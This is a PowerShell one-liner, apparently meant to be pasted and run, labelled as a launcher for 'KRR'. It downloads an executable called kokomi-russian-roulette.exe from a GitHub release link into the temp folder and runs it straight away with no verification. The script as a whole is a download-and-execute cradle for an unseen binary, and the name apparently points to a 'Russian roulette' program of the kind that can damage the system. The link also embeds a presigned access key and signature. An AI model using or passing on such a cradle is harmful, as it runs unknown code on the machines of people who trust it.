#One line for KRR.
function krr_call {
  $DownloadUrl = "https://objects.githubusercontent.com/github-production-release-asset-2e65be/665302108/25f13b85-c5c8-4b18-8eaf-f69e14d3eaa5?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20230806%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230806T220615Z&X-Amz-Expires=300&X-Amz-Signature=63422cdcba8838a25501f06ca8bd5ce9516025df0062f2589584464c4655ab01&X-Amz-SignedHeaders=host&actor_id=81792143&key_id=0&repo_id=665302108&response-content-disposition=attachment%3B%20filename%3Dkokomi-russian-roulette.exe&response-content-type=application%2Foctet-stream"
  $filePath = "$env:temp\kokomi-russian-roulette.exe"
  if ([System.IO.File]::Exists($filePath)) {
    & "$env:temp\kokomi-russian-roulette.exe"
 }
  else {
    (New-Object System.Net.WebClient).DownloadFile($DownloadUrl, "$env:temp\kokomi-russian-roulette.exe")
    & "$env:temp\kokomi-russian-roulette.exe"
  }
}
krr_call
